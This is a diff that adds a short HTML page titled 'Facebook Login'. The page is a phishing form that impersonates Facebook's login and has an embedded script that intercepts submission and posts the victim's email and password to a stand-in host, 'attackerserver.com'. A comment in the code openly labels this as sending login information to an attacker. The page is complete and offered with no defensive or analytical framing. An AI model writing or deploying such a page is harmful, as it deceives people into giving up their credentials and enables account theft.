@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Facebook Login</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+
+	<form>
+		<label for="email">Email:</label><br>
+		<input type="email" id="email" name="email"><br>
+		<label for="password">Password:</label><br>
+		<input type="password" id="password" name="password"><br>
+		<input type="submit" value="Log In">
+	</form>
+
+	<script>
+		// Send login information to attacker's server
+		const form = document.querySelector('form');
+		form.addEventListener('submit', (event) => {
+			event.preventDefault();
+			const email = document.getElementById('email').value;
+			const password = document.getElementById('password').value;
+			const request = new XMLHttpRequest();
+			request.open('POST', 'http://attackerserver.com', true);
+			request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
+			request.send(`email=${email}&password=${password}`);
+		});
+	</script>
+
+</body>
+</html>
